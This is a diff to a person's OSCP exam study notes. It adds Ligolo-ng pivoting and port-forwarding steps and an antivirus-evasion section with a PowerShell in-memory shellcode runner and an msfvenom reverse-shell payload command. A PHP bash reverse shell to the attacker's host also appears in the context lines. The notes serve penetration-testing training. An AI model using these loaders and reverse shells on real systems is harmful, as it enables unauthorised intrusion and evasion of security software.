@@ -190,21 +190,27 @@ OR
 
 # Port Forwarding
 ## Ligolo
-- From Kali:
-	- sudo ip tuntap add user pop mode tun ligolo
-	- sudo ip link set ligolo up
-	- sudo ip route add \<target ip.0/24> dev ligolo
-	- ./proxy -selfcert
-- From Windows Target (agent file):
-	- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
-- From Linux Target (agent file):
-	- ligolo -connect \<kali IP>:11601 -ignore-cert
-- Then from Kali:
-	- Session
-	- 1
-	- Start
-	- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
-		- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine)
+https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9
+**Basic usage**
+	- From Kali:
+		- sudo ip tuntap add user pop mode tun ligolo
+		- sudo ip link set ligolo up
+		- sudo ip route add \<target ip.0/24> dev ligolo
+		- ./proxy -selfcert
+	- From Windows Target (agent file):
+		- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
+	- From Linux Target (agent file):
+		- ligolo -connect \<kali IP>:11601 -ignore-cert
+	- Then from Kali:
+		- Session
+		- 1
+		- Start
+		- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
+			- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). <br>
+
+ **Local Port Forwarding:**
+	- `ip route add 240.0.0.1/32 dev`
+	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on.
 
 # File Sharing
 ### Python server
@@ -303,6 +309,46 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
 	    ?>
 
+
+
+
+# Miscellaneous Topics
+## Antivirus Evasion
+As these are my OSCP notes, and AV Evasion is outside the scope of the exam, I'm mostly leaving this content out of the guide for brevity. Below is a script for manual exploitation. It must be saved as an *.ps1 file, transferred to the victim Windows machine, and ran (after powershell -ep bypass). 
+
+    $code = '
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    [DllImport("msvcrt.dll")]
+    public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+    
+    $winFunc = 
+      Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+    
+    [Byte[]];
+    [Byte[]]$sc = <place your shellcode here>;
+    
+    $size = 0x1000;
+    
+    if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+    
+    $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+    
+    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+    
+    $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+
+For the field that says "place your shellcode here," such code can be generated using msfvenom like this:
+- msfvenom -p windows/shell_reverse_tcp LHOST=\<kali IP> LPORT=443 -f powershell -v sc 
+
+
+
+## Buffer Overflow
+As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
 
 
 
